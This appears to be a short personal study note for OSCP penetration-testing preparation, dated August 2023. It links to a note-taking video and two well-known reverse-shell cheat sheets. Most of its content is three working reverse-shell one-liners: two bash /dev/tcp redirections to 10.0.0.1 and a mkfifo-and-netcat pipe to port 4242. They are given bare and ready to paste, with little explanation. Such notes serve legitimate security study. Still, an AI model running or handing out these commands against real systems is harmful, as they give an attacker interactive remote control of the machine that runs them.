### 26082023Sat

[OSCP - How to Take Effective Notes](https://youtu.be/yYmDQY1zKKE?list=PLDrNMcTNhhYqZU1ySROli7Oc08mxe1tZR)

https://www.youtube.com/@c0nd4

```
/bin/cat cat
```

```
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/53 0>&1
```

[Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Netcat OpenBsd

```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

